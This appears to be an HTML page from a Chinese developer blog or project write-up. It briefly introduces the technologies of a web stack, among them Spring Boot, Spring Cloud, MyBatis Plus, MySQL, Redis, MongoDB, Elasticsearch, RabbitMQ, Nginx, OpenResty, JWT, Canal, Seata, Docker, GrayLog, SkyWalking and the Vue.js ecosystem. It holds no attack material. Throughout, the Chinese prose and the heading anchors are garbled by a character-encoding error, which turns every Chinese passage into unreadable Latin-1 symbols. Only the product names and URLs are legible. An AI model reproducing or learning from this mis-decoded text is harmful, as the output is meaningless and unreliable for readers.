<h1 id="äºŒã€ç›¸å…³æŠ€æœ¯ä»‹ç»"><a href="#äºŒã€ç›¸å…³æŠ€æœ¯ä»‹ç»" class="headerlink" title="äºŒã€ç›¸å…³æŠ€æœ¯ä»‹ç»"></a>äºŒã€ç›¸å…³æŠ€æœ¯ä»‹ç»</h1><h2 id="Spring-Boot"><a href="#Spring-Boot" class="headerlink" title="Spring Boot"></a>Spring Boot</h2><p>Spring Boot æ˜¯æ‰€æœ‰åŸºäº Spring å¼€å‘çš„é¡¹ç›®çš„èµ·ç‚¹ã€‚Spring Boot çš„è®¾è®¡æ˜¯ä¸ºäº†è®©ä½ å°½å¯èƒ½å¿«çš„è·‘èµ·æ¥ Spring åº”ç”¨ç¨‹åºå¹¶ä¸”å°½å¯èƒ½å‡å°‘ä½ çš„é…ç½®æ–‡ä»¶ã€‚ç®€å•æ¥è¯´å°±æ˜¯SpringBootå…¶å®ä¸æ˜¯ä»€ä¹ˆæ–°çš„æ¡†æ¶ï¼Œå®ƒé»˜è®¤é…ç½®äº†å¾ˆå¤šæ¡†æ¶çš„ä½¿ç”¨æ–¹å¼ï¼Œå°±åƒmavenæ•´åˆäº†æ‰€æœ‰çš„jaråŒ…ï¼Œspring bootæ•´åˆäº†æ‰€æœ‰çš„æ¡†æ¶ã€‚</p>
<h2 id="Spring-Cloud"><a href="#Spring-Cloud" class="headerlink" title="Spring Cloud"></a>Spring Cloud</h2><p>SpringCloudæ˜¯å¾®æœåŠ¡æ¶æ„ä¸­çš„é›†æˆï¼Œå°†ä¸€ç³»åˆ—ä¼˜ç§€çš„ç»„ä»¶è¿›è¡Œäº†æ•´åˆã€‚åŸºäºSpringBootæ„å»ºã€‚</p>
<h2 id="Mybatis-Plus"><a href="#Mybatis-Plus" class="headerlink" title="Mybatis Plus"></a>Mybatis Plus</h2><p>ä¸€ä¸ª MyBatisçš„å¢å¼ºå·¥å…·ï¼Œåœ¨ MyBatis çš„åŸºç¡€ä¸Šåªåšå¢å¼ºä¸åšæ”¹å˜ï¼Œä¸ºç®€åŒ–å¼€å‘ã€æé«˜æ•ˆç‡è€Œç”Ÿã€‚</p>
<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>MySQLæ˜¯ä¸€ä¸ªå¼€æ”¾æºç çš„å°å‹å…³è”å¼æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œå¼€å‘è€…ä¸ºç‘å…¸MySQL ABå…¬å¸ã€‚ç›®å‰MySQLè¢«å¹¿æ³›åœ°åº”ç”¨åœ¨Internetä¸Šçš„ä¸­å°å‹ç½‘ç«™ä¸­ã€‚ç”±äºå…¶ä½“ç§¯å°ã€é€Ÿåº¦å¿«ã€æ€»ä½“æ‹¥æœ‰æˆæœ¬ä½ï¼Œå°¤å…¶æ˜¯å¼€æ”¾æºç è¿™ä¸€ç‰¹ç‚¹ï¼Œè®¸å¤šä¸­å°å‹ç½‘ç«™ä¸ºäº†é™ä½ç½‘ç«™æ€»ä½“æ‹¥æœ‰æˆæœ¬è€Œé€‰æ‹©äº†MySQLä½œä¸ºç½‘ç«™æ•°æ®åº“ã€‚</p>
<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>Redis æ˜¯å®Œå…¨å¼€æºçš„ï¼Œéµå®ˆ BSD åè®®ï¼Œæ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„ key-value æ•°æ®åº“ã€‚</p>
<p>Redis ä¸å…¶ä»– key - value ç¼“å­˜äº§å“æœ‰ä»¥ä¸‹ä¸‰ä¸ªç‰¹ç‚¹ï¼š</p>
<ul>
<li>Redisæ”¯æŒæ•°æ®çš„æŒä¹…åŒ–ï¼Œå¯ä»¥å°†å†…å­˜ä¸­çš„æ•°æ®ä¿å­˜åœ¨ç£ç›˜ä¸­ï¼Œé‡å¯çš„æ—¶å€™å¯ä»¥å†æ¬¡åŠ è½½è¿›è¡Œä½¿ç”¨ã€‚</li>
<li>Redisä¸ä»…ä»…æ”¯æŒç®€å•çš„key-valueç±»å‹çš„æ•°æ®ï¼ŒåŒæ—¶è¿˜æä¾›listï¼Œsetï¼Œzsetï¼Œhashç­‰æ•°æ®ç»“æ„çš„å­˜å‚¨ã€‚</li>
<li>Redisæ”¯æŒæ•°æ®çš„å¤‡ä»½ï¼Œå³master-slaveæ¨¡å¼çš„æ•°æ®å¤‡ä»½ã€‚</li>
</ul>
<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><p>MongoDB æ˜¯ä¸€ä¸ªå¼€æºçš„ï¼Œé«˜æ€§èƒ½ï¼Œæ— æ¨¡å¼ï¼ˆæˆ–è€…è¯´æ˜¯æ¨¡å¼è‡ªç”±ï¼‰ï¼Œä½¿ç”¨ C++ è¯­è¨€ç¼–å†™çš„é¢å‘æ–‡æ¡£çš„æ•°æ®åº“ã€‚æ­£å› ä¸º MongoDB æ˜¯é¢å‘æ–‡æ¡£çš„ï¼Œæ‰€ä»¥å®ƒå¯ä»¥ç®¡ç†ç±»ä¼¼ JSON çš„æ–‡æ¡£é›†åˆã€‚åˆå› ä¸ºæ•°æ®å¯ä»¥è¢«åµŒå¥—åˆ°å¤æ‚çš„ä½“ç³»ä¸­å¹¶ä¿æŒå¯ä»¥æŸ¥è¯¢å¯ç´¢å¼•ï¼Œè¿™æ ·ä¸€æ¥ï¼Œåº”ç”¨ç¨‹åºä¾¿å¯ä»¥ä»¥ä¸€ç§æ›´åŠ è‡ªç„¶çš„æ–¹å¼æ¥ä¸ºæ•°æ®å»ºæ¨¡ã€‚</p>
<p>Mongo é€‚åˆç”¨äºä»¥ä¸‹åœºæ™¯ï¼š</p>
<ul>
<li>ç½‘ç«™æ•°æ®ï¼šMongoéå¸¸é€‚åˆå®æ—¶çš„æ’å…¥ï¼Œæ›´æ–°ä¸æŸ¥è¯¢ï¼Œå¹¶å…·å¤‡ç½‘ç«™å®æ—¶æ•°æ®å­˜å‚¨æ‰€éœ€çš„å¤åˆ¶åŠé«˜åº¦ä¼¸ç¼©æ€§ã€‚</li>
<li>ç¼“å­˜ï¼šç”±äºæ€§èƒ½å¾ˆé«˜ï¼ŒMongoä¹Ÿé€‚åˆä½œä¸ºä¿¡æ¯åŸºç¡€è®¾æ–½çš„ç¼“å­˜å±‚ã€‚åœ¨ç³»ç»Ÿé‡å¯ä¹‹åï¼Œç”±Mongoæ­å»ºçš„æŒä¹…åŒ–ç¼“å­˜å±‚å¯ä»¥é¿å…ä¸‹å±‚çš„æ•°æ®æºè¿‡è½½ã€‚</li>
<li>å¤§å°ºå¯¸ï¼Œä½ä»·å€¼çš„æ•°æ®ï¼šä½¿ç”¨ä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“å­˜å‚¨ä¸€äº›æ•°æ®æ—¶å¯èƒ½ä¼šæ¯”è¾ƒæ˜‚è´µï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œå¾ˆå¤šæ—¶å€™ç¨‹åºå‘˜å¾€å¾€ä¼šé€‰æ‹©ä¼ ç»Ÿçš„æ–‡ä»¶è¿›è¡Œå­˜å‚¨ã€‚</li>
<li>é«˜ä¼¸ç¼©æ€§çš„åœºæ™¯ï¼šMongoéå¸¸é€‚åˆç”±æ•°åæˆ–æ•°ç™¾å°æœåŠ¡å™¨ç»„æˆçš„æ•°æ®åº“ã€‚Mongoçš„è·¯çº¿å›¾ä¸­å·²ç»åŒ…å«å¯¹MapReduceå¼•æ“çš„å†…ç½®æ”¯æŒã€‚</li>
<li>ç”¨äºå¯¹è±¡åŠJSONæ•°æ®çš„å­˜å‚¨ï¼šMongoçš„BSONæ•°æ®æ ¼å¼éå¸¸é€‚åˆæ–‡æ¡£åŒ–æ ¼å¼çš„å­˜å‚¨åŠæŸ¥è¯¢ã€‚</li>
</ul>
<h2 id="ElasticSearch"><a href="#ElasticSearch" class="headerlink" title="ElasticSearch"></a>ElasticSearch</h2><p><strong>Elasticsearch</strong>æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„æœç´¢å¼•æ“ã€‚å®ƒç›®å‰è¢«å¹¿æ³›åœ°ä½¿ç”¨äºå„ä¸ªITå…¬å¸ã€‚Elasticsearchæ˜¯ç”±Elasticå…¬å¸åˆ›å»ºå¹¶å¼€æºç»´æŠ¤çš„ã€‚å®ƒçš„å¼€æºä»£ç ä½äº <a href="https://github.com/elastic/elasticsearch%E3%80%82">github.com&#x2F;elastic&#x2F;elaâ€¦</a> åŒæ—¶ï¼ŒElasticå…¬å¸ä¹Ÿæ‹¥æœ‰<a href="https://github.com/elastic/logstash">Logstash</a>åŠ<a href="https://github.com/elastic/kibana">Kibana</a>å¼€æºé¡¹ç›®ã€‚è¿™ä¸ªä¸‰ä¸ªå¼€æºé¡¹ç›®ç»„åˆåœ¨ä¸€èµ·ï¼Œå°±å½¢æˆäº† <strong>ELK</strong> è½¯ä»¶æ ˆã€‚ä»–ä»¬ä¸‰ä¸ªå…±åŒå½¢æˆäº†ä¸€ä¸ªå¼ºå¤§çš„ç”Ÿæ€åœˆã€‚ç®€å•åœ°è¯´ï¼Œ<strong>L</strong>ogstashè´Ÿè´£æ•°æ®çš„é‡‡é›†ï¼Œå¤„ç†ï¼ˆä¸°å¯Œæ•°æ®ï¼Œæ•°æ®è½¬å‹ç­‰ï¼‰ï¼Œ<strong>K</strong>ibanaè´Ÿè´£æ•°æ®å±•ï¼Œåˆ†æåŠç®¡ç†ã€‚<strong>E</strong>lasticsearchå¤„äºæœ€æ ¸å¿ƒçš„ä½ç½®ï¼Œå®ƒå¯ä»¥å¸®æˆ‘ä»¬å¯¹æ•°æ®è¿›è¡Œå¿«é€Ÿåœ°æœç´¢åŠåˆ†æã€‚</p>
<h2 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h2><p>æ¶ˆæ¯é˜Ÿåˆ—æä¾›ä¸€ä¸ªå¼‚æ­¥é€šä¿¡æœºåˆ¶ï¼Œæ¶ˆæ¯çš„å‘é€è€…ä¸å¿…ä¸€ç›´ç­‰å¾…åˆ°æ¶ˆæ¯è¢«æˆåŠŸå¤„ç†æ‰è¿”å›ï¼Œè€Œæ˜¯ç«‹å³è¿”å›ã€‚æ¶ˆæ¯ä¸­é—´ä»¶è´Ÿè´£å¤„ç†ç½‘ç»œé€šä¿¡ï¼Œå¦‚æœç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œæ¶ˆæ¯è¢«æš‚å­˜äºé˜Ÿåˆ—å½“ä¸­ï¼Œå½“ç½‘ç»œç•…é€šçš„æ—¶å€™åœ¨å°†æ¶ˆæ¯è½¬å‘ç»™ç›¸åº”çš„åº”ç”¨ç¨‹åºæˆ–è€…æœåŠ¡ï¼Œå½“ç„¶å‰ææ˜¯è¿™äº›æœåŠ¡è®¢é˜…äº†è¯¥é˜Ÿåˆ—ã€‚å¦‚æœåœ¨å•†å“æœåŠ¡å’Œè®¢å•æœåŠ¡ä¹‹é—´ä½¿ç”¨æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œæ—¢å¯ä»¥æé«˜å¹¶å‘é‡ï¼Œåˆé™ä½æœåŠ¡ä¹‹é—´çš„è€¦åˆåº¦ã€‚</p>
<p>RabbitMQå°±æ˜¯è¿™æ ·ä¸€æ¬¾æˆ‘ä»¬è‹¦è‹¦è¿½å¯»çš„æ¶ˆæ¯é˜Ÿåˆ—ã€‚RabbitMQæ˜¯ä¸€ä¸ªå¼€æºçš„æ¶ˆæ¯ä»£ç†çš„é˜Ÿåˆ—æœåŠ¡å™¨ï¼Œç”¨æ¥é€šè¿‡æ™®é€šåè®®åœ¨å®Œå…¨ä¸åŒçš„åº”ç”¨ä¹‹é—´å…±äº«æ•°æ®ã€‚</p>
<p>RabbitMQæ˜¯ä½¿ç”¨Erlangè¯­è¨€æ¥ç¼–å†™çš„ï¼Œå¹¶ä¸”RabbitMQæ˜¯åŸºäºAMQPåè®®çš„ã€‚Erlangè¯­è¨€åœ¨æ•°æ®äº¤äº’æ–¹é¢æ€§èƒ½ä¼˜ç§€ï¼Œæœ‰ç€å’ŒåŸç”ŸSocketä¸€æ ·çš„å»¶è¿Ÿï¼Œè¿™ä¹Ÿæ˜¯RabbitMQé«˜æ€§èƒ½çš„åŸå› æ‰€åœ¨ã€‚å¯è°“â€œäººå¦‚å…¶åâ€ï¼ŒRabbitMQåƒå…”å­ä¸€æ ·è¿…é€Ÿã€‚</p>
<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>nginxæ˜¯ä¸€ä¸ª<strong>é«˜æ€§èƒ½çš„HTTP</strong>å’Œ<strong>åå‘ä»£ç†æœåŠ¡å™¨</strong>,å…¶ç‰¹ç‚¹æ˜¯å ç”¨å†…å­˜å°‘,å¹¶å‘èƒ½åŠ›å¼º.</p>
<h2 id="Openresty"><a href="#Openresty" class="headerlink" title="Openresty"></a>Openresty</h2><p>OpenRestyæ˜¯ä¸€ä¸ªåŸºäº Nginx ä¸ Lua çš„é«˜æ€§èƒ½ Web å¹³å°ï¼Œå…¶å†…éƒ¨é›†æˆäº†å¤§é‡ç²¾è‰¯çš„ Lua åº“ã€ç¬¬ä¸‰æ–¹æ¨¡å—ä»¥åŠå¤§å¤šæ•°çš„ä¾èµ–é¡¹ã€‚ç”¨äºæ–¹ä¾¿åœ°æ­å»ºèƒ½å¤Ÿå¤„ç†è¶…é«˜å¹¶å‘ã€æ‰©å±•æ€§æé«˜çš„åŠ¨æ€ Web åº”ç”¨ã€Web æœåŠ¡å’ŒåŠ¨æ€ç½‘å…³ã€‚</p>
<p>OpenRestyé€šè¿‡æ±‡èšå„ç§è®¾è®¡ç²¾è‰¯çš„ Nginx æ¨¡å—ï¼ˆä¸»è¦ç”± OpenResty å›¢é˜Ÿè‡ªä¸»å¼€å‘ï¼‰ï¼Œä»è€Œå°† Nginx æœ‰æ•ˆåœ°å˜æˆä¸€ä¸ªå¼ºå¤§çš„é€šç”¨ Web åº”ç”¨å¹³å°ã€‚è¿™æ ·ï¼ŒWeb å¼€å‘äººå‘˜å’Œç³»ç»Ÿå·¥ç¨‹å¸ˆå¯ä»¥ä½¿ç”¨ Lua è„šæœ¬è¯­è¨€è°ƒåŠ¨ Nginx æ”¯æŒçš„å„ç§ C ä»¥åŠ Lua æ¨¡å—ï¼Œå¿«é€Ÿæ„é€ å‡ºè¶³ä»¥èƒœä»» 10K ä¹ƒè‡³ 1000K ä»¥ä¸Šå•æœºå¹¶å‘è¿æ¥çš„é«˜æ€§èƒ½ Web åº”ç”¨ç³»ç»Ÿã€‚</p>
<p>OpenRestyçš„ç›®æ ‡æ˜¯è®©ä½ çš„WebæœåŠ¡ç›´æ¥è·‘åœ¨ Nginx æœåŠ¡å†…éƒ¨ï¼Œå……åˆ†åˆ©ç”¨ Nginx çš„éé˜»å¡ I&#x2F;O æ¨¡å‹ï¼Œä¸ä»…ä»…å¯¹ HTTP å®¢æˆ·ç«¯è¯·æ±‚,ç”šè‡³äºå¯¹è¿œç¨‹åç«¯è¯¸å¦‚ MySQLã€PostgreSQLã€Memcached ä»¥åŠ Redis ç­‰éƒ½è¿›è¡Œä¸€è‡´çš„é«˜æ€§èƒ½å“åº”ã€‚</p>
<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>JSON Web Token (JWT)æ˜¯ä¸€ä¸ªå¼€æ”¾æ ‡å‡†(RFC 7519)ï¼Œå®ƒå®šä¹‰äº†ä¸€ç§ç´§å‡‘çš„ã€è‡ªåŒ…å«çš„æ–¹å¼ï¼Œç”¨äºä½œä¸ºJSONå¯¹è±¡åœ¨å„æ–¹ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“ä¿¡æ¯ã€‚ è¯¥ä¿¡æ¯å¯ä»¥è¢«éªŒè¯å’Œä¿¡ä»»ï¼Œå› ä¸ºå®ƒæ˜¯æ•°å­—ç­¾åçš„ã€‚</p>
<h2 id="Canal"><a href="#Canal" class="headerlink" title="Canal"></a>Canal</h2><p> Canalæ˜¯é˜¿é‡Œå·´å·´æ——ä¸‹çš„ä¸€æ¬¾å¼€æºé¡¹ç›®ï¼Œçº¯Javaå¼€å‘ã€‚ åŸºäºæ•°æ®åº“å¢é‡æ—¥å¿—è§£æï¼Œæä¾›å¢é‡æ•°æ®è®¢é˜…&amp;æ¶ˆè´¹ï¼Œç›®å‰ä¸»è¦æ”¯æŒäº†MySQLï¼ˆä¹Ÿæ”¯æŒmariaDBï¼‰ã€‚</p>
<h2 id="Seata"><a href="#Seata" class="headerlink" title="Seata"></a>Seata</h2><p>Seata æ˜¯ä¸€æ¬¾å¼€æºçš„åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆï¼Œè‡´åŠ›äºæä¾›é«˜æ€§èƒ½å’Œç®€å•æ˜“ç”¨çš„åˆ†å¸ƒå¼äº‹åŠ¡æœåŠ¡ã€‚Seata å°†ä¸ºç”¨æˆ·æä¾›äº† ATã€TCCã€SAGA å’Œ XA äº‹åŠ¡æ¨¡å¼ï¼Œä¸ºç”¨æˆ·æ‰“é€ ä¸€ç«™å¼çš„åˆ†å¸ƒå¼è§£å†³æ–¹æ¡ˆã€‚</p>
<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>Docker æ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç è½¯ä»¶é¡¹ç›®ï¼Œé¡¹ç›®ä¸»è¦ä»£ç åœ¨2013å¹´å¼€æºäº <a href="https://github.com/moby/moby">GitHub</a>ã€‚å®ƒæ˜¯äº‘æœåŠ¡æŠ€æœ¯ä¸Šçš„ä¸€æ¬¡åˆ›æ–°ï¼Œè®©åº”ç”¨ç¨‹åºå¸ƒç½²åœ¨è½¯ä»¶å®¹å™¨ä¸‹çš„å·¥ä½œå¯ä»¥è‡ªåŠ¨åŒ–è¿›è¡Œï¼Œå€Ÿæ­¤åœ¨ Linux æ“ä½œç³»ç»Ÿä¸Šï¼Œæä¾›ä¸€ä¸ªé¢å¤–çš„è½¯ä»¶æŠ½è±¡å±‚ï¼Œä»¥åŠæ“ä½œç³»ç»Ÿå±‚è™šæ‹ŸåŒ–çš„è‡ªåŠ¨ç®¡ç†æœºåˆ¶ã€‚</p>
<p>Docker åˆ©ç”¨ Linux æ ¸å¿ƒä¸­çš„èµ„æºåˆ†è„±æœºåˆ¶ï¼Œä¾‹å¦‚ cgroupsï¼Œä»¥åŠ Linux æ ¸å¿ƒåå­—ç©ºé—´ï¼ˆname spaceï¼‰ï¼Œæ¥åˆ›å»ºç‹¬ç«‹çš„è½¯ä»¶å®¹å™¨ï¼ˆcontainersï¼‰ï¼Œå±äºæ“ä½œç³»ç»Ÿå±‚é¢çš„è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚ç”±äºéš”ç¦»çš„è¿›ç¨‹ç‹¬ç«‹äºå®¿ä¸»å’Œå…¶å®ƒçš„éš”ç¦»çš„è¿›ç¨‹ï¼Œå› æ­¤ä¹Ÿç§°å…¶ä¸ºå®¹å™¨ã€‚Docker åœ¨å®¹å™¨çš„åŸºç¡€ä¸Šè¿›è¡Œäº†è¿›ä¸€æ­¥çš„å°è£…ï¼Œä»æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œäº’è”åˆ°è¿›ç¨‹éš”ç¦»ç­‰ç­‰ï¼Œæå¤§çš„ç®€åŒ–äº†å®¹å™¨çš„åˆ›å»ºå’Œç»´æŠ¤ï¼Œä½¿å¾—å…¶æ¯”è™šæ‹ŸæœºæŠ€æœ¯æ›´ä¸ºè½»ä¾¿ã€å¿«æ·ã€‚Docker å¯ä»¥åœ¨å•ä¸€ Linux å®ä½“ä¸‹è¿ä½œï¼Œé¿å…å› ä¸ºåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœºè€Œé€ æˆçš„é¢å¤–è´Ÿæ‹…ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120457.png" alt="æˆªå±2021-07-03 ä¸Šåˆ9.41.39"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120458.png" alt="æˆªå±2021-07-03 ä¸Šåˆ9.41.47"></p>
<h2 id="GrayLog"><a href="#GrayLog" class="headerlink" title="GrayLog"></a>GrayLog</h2><p><strong>Enterprise Log Management for All</strong>ã€‚<br>ä¸€ä¸ªå…·æœ‰æŠ¥è­¦é€‰é¡¹çš„å¯æ’å…¥æ—¥å¿—å’Œäº‹ä»¶åˆ†ææœåŠ¡å™¨ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120459.png" alt="æˆªå±2021-07-03 ä¸Šåˆ9.47.48"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120460.png" alt="æˆªå±2021-07-03 ä¸Šåˆ9.48.00"></p>
<h2 id="Skywalking"><a href="#Skywalking" class="headerlink" title="Skywalking"></a>Skywalking</h2><p>SkyWalkingæ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿçš„åº”ç”¨ç¨‹åºæ€§èƒ½ç›‘è§†å·¥å…·ï¼Œä¸“ä¸ºå¾®æœåŠ¡ã€äº‘åŸç”Ÿæ¶æ„å’ŒåŸºäºå®¹å™¨ï¼ˆDockerã€K8Sã€Mesosï¼‰æ¶æ„è€Œè®¾è®¡</p>
<p>SkyWalkingæ˜¯è§‚å¯Ÿæ€§åˆ†æå¹³å°å’Œåº”ç”¨æ€§èƒ½ç®¡ç†ç³»ç»Ÿã€‚æä¾›åˆ†å¸ƒå¼è¿½è¸ªã€æœåŠ¡ç½‘æ ¼é¥æµ‹åˆ†æã€åº¦é‡èšåˆå’Œå¯è§†åŒ–ä¸€ä½“åŒ–è§£å†³æ–¹æ¡ˆ</p>
<p>SkyWalkingæ˜¯ä¸€ä¸ªå¼€æºAPMç³»ç»Ÿï¼ŒåŒ…æ‹¬å¯¹Cloud Nativeä½“ç³»ç»“æ„ä¸­çš„åˆ†å¸ƒå¼ç³»ç»Ÿçš„ç›‘è§†ï¼Œè·Ÿè¸ªï¼Œè¯Šæ–­åŠŸèƒ½ã€‚ æ ¸å¿ƒåŠŸèƒ½å¦‚ä¸‹ã€‚</p>
<ul>
<li>æœåŠ¡ï¼ŒæœåŠ¡å®ä¾‹ï¼Œç«¯ç‚¹æŒ‡æ ‡åˆ†æ</li>
<li>æ ¹æœ¬åŸå› åˆ†æ</li>
<li>æœåŠ¡æ‹“æ‰‘å›¾åˆ†æ</li>
<li>æœåŠ¡ï¼ŒæœåŠ¡å®ä¾‹å’Œç«¯ç‚¹ä¾èµ–å…³ç³»åˆ†æ</li>
<li>æ£€æµ‹åˆ°æ…¢é€ŸæœåŠ¡å’Œç«¯ç‚¹</li>
<li>æ€§èƒ½ä¼˜åŒ–</li>
<li>åˆ†å¸ƒå¼è·Ÿè¸ªå’Œä¸Šä¸‹æ–‡ä¼ æ’­</li>
<li>æ•°æ®åº“è®¿é—®æŒ‡æ ‡ã€‚ æ£€æµ‹æ…¢é€Ÿæ•°æ®åº“è®¿é—®è¯­å¥ï¼ˆåŒ…æ‹¬SQLè¯­å¥ï¼‰ã€‚</li>
<li>æŠ¥è­¦</li>
</ul>
<p>SkyWalkingæ”¯æŒä»å¤šç§æ¥æºå’Œå¤šç§æ ¼å¼æ”¶é›†é¥æµ‹ï¼ˆè·Ÿè¸ªå’Œåº¦é‡ï¼‰æ•°æ®ï¼ŒåŒ…æ‹¬</p>
<ul>
<li>SkyWalkingæ ¼å¼çš„Javaï¼Œ.NET Coreï¼ŒNodeJSå’ŒPHPè‡ªåŠ¨ä»ªå™¨ä»£ç†</li>
<li>SkyWalkingæ ¼å¼çš„æ‰‹åŠ¨ä»ªå™¨Goä»£ç†ã€‚</li>
<li>Istioé¥æµ‹æ ¼å¼</li>
<li>ç”±Istioæ§åˆ¶çš„æœåŠ¡ç½‘æ ¼ä¸­çš„Envoy gRPCè®¿é—®æ—¥å¿—æœåŠ¡ï¼ˆALSï¼‰æ ¼å¼</li>
<li>ç‰¹ä½¿æŒ‡æ ‡æœåŠ¡æ ¼å¼ã€‚</li>
<li>Zipkin v1 &#x2F; v2æ ¼å¼ã€‚</li>
<li>Jaeger gRPCæ ¼å¼ã€‚</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120461.png" alt="image-20210703095106687"></p>
<h2 id="Vue-js"><a href="#Vue-js" class="headerlink" title="Vue.js"></a>Vue.js</h2><p>Vue.jsæ˜¯ä¸€å¥—ç”¨äºæ„å»ºç”¨æˆ·ç•Œé¢çš„æ¸è¿›å¼æ¡†æ¶ã€‚ä¸å…¶å®ƒå¤§å‹æ¡†æ¶ä¸åŒçš„æ˜¯ï¼ŒVue è¢«è®¾è®¡ä¸ºå¯ä»¥è‡ªåº•å‘ä¸Šé€å±‚åº”ç”¨ã€‚Vue çš„æ ¸å¿ƒåº“åªå…³æ³¨è§†å›¾å±‚ï¼Œä¸ä»…æ˜“äºä¸Šæ‰‹ï¼Œè¿˜ä¾¿äºä¸ç¬¬ä¸‰æ–¹åº“æˆ–æ—¢æœ‰é¡¹ç›®æ•´åˆã€‚Vueæ‹¥æœ‰æ¯”reactæ›´ç®€å•å¥½ç”¨çš„åŒå‘æ•°æ®ç»‘å®šã€‚</p>
<h2 id="Vue-CLI-è„šæ‰‹æ¶"><a href="#Vue-CLI-è„šæ‰‹æ¶" class="headerlink" title="Vue CLI è„šæ‰‹æ¶"></a>Vue CLI è„šæ‰‹æ¶</h2><p>Vue CLI è„šæ‰‹æ¶å¯ä»¥å¿«é€Ÿç”Ÿæˆå‰ç«¯é¡¹ç›®çš„æ–‡ä»¶é…ç½®ï¼Œå…¶è‡´åŠ›äºå°† Vue ç”Ÿæ€ä¸­çš„å·¥å…·åŸºç¡€æ ‡å‡†åŒ–ï¼Œè¿™æ ·å¼€å‘è€…å¯ä»¥ä¸“æ³¨åœ¨æ’°å†™åº”ç”¨ä¸Šï¼Œè€Œä¸å¿…èŠ±æ—¶é—´å»çº ç»“é…ç½®çš„é—®é¢˜ã€‚ä¸æ­¤åŒæ—¶ï¼Œå®ƒä¹Ÿä¸ºæ¯ä¸ªå·¥å…·æä¾›äº†è°ƒæ•´é…ç½®çš„çµæ´»æ€§ã€‚</p>
<h2 id="element-UI-Vant-ç»„ä»¶åº“"><a href="#element-UI-Vant-ç»„ä»¶åº“" class="headerlink" title="element-UI + Vant ç»„ä»¶åº“"></a>element-UI + Vant ç»„ä»¶åº“</h2><p>  ç”±äºå‰ç«¯å¼€å‘çš„æ¨¡å—åŒ–ã€ç»„ä»¶åŒ–çš„å…´èµ·ï¼Œå¯¼è‡´äº†å¾ˆå¤šå¼€æºç»„ä»¶åº“çš„äº§ç”Ÿã€‚ç»„ä»¶åº“å°±æ˜¯ä¸€å¥—ä¸ºå¼€å‘è€…ã€è®¾è®¡å¸ˆå’Œäº§å“ç»ç†å‡†å¤‡çš„åŸºäº Vue æˆ– react çš„æ¡Œé¢ç«¯ç»„ä»¶çš„é›†åˆï¼Œå®ƒå¯ä»¥å¤§å¤§åŠ å¿«ç¨‹åºå‘˜çš„å¼€å‘æ•ˆç‡ã€‚</p>
<h2 id="Axios"><a href="#Axios" class="headerlink" title="Axios"></a>Axios</h2><p>åŸºäºpromiseç”¨äºæµè§ˆå™¨å’Œnode.jsçš„httpå®¢æˆ·ç«¯ï¼Œaxios æ˜¯å¯¹ ajax æŠ€æœ¯çš„å°è£…ï¼Œä¸»è¦æ˜¯å‰ç«¯ç”¨æ¥ä¸æœåŠ¡å™¨è¿›è¡Œæ•°æ®äº¤æ¢ä½¿ç”¨ã€‚</p>
<h2 id="Vue-Router"><a href="#Vue-Router" class="headerlink" title="Vue Router"></a>Vue Router</h2><p>Vue Router æ˜¯ <a href="http://cn.vuejs.org/">Vue.jsâ€‚</a>å®˜æ–¹çš„è·¯ç”±ç®¡ç†å™¨ã€‚é€šè¿‡Vue Router åœ¨è·¯ç”±å™¨é…ç½®ä¸­å»ºç«‹ç»„ä»¶ä¸è·¯ç”±è·¯å¾„çš„ä¸€ä¸€å¯¹åº”ï¼Œå¹¶é€šè¿‡è·¯ç”±å™¨ç›‘å¬å™¨ç›‘å¬è·¯ç”±è·¯å¾„çš„æ”¹å˜ï¼Œä»¥æ­¤è¾¾åˆ°åˆ‡æ¢ç»„ä»¶çš„åŠŸèƒ½ã€‚</p>
<h2 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h2><p>Vuex æ˜¯ä¸€ä¸ªä¸“ä¸º Vue.js åº”ç”¨ç¨‹åºå¼€å‘çš„çŠ¶æ€ç®¡ç†æ¨¡å¼ã€‚å®ƒé‡‡ç”¨é›†ä¸­å¼å­˜å‚¨ç®¡ç†åº”ç”¨çš„æ‰€æœ‰ç»„ä»¶çš„çŠ¶æ€ï¼Œå¹¶ä»¥ç›¸åº”çš„è§„åˆ™ä¿è¯çŠ¶æ€ä»¥ä¸€ç§å¯é¢„æµ‹çš„æ–¹å¼å‘ç”Ÿå˜åŒ–ã€‚Vuex ä¹Ÿé›†æˆåˆ° Vue çš„å®˜æ–¹è°ƒè¯•å·¥å…· <a href="https://github.com/vuejs/vue-devtools">devtools extensionâ€‚</a>ï¼Œæä¾›äº†è¯¸å¦‚é›¶é…ç½®çš„ time-travel è°ƒè¯•ã€çŠ¶æ€å¿«ç…§å¯¼å…¥å¯¼å‡ºç­‰é«˜çº§è°ƒè¯•åŠŸèƒ½ã€‚</p>
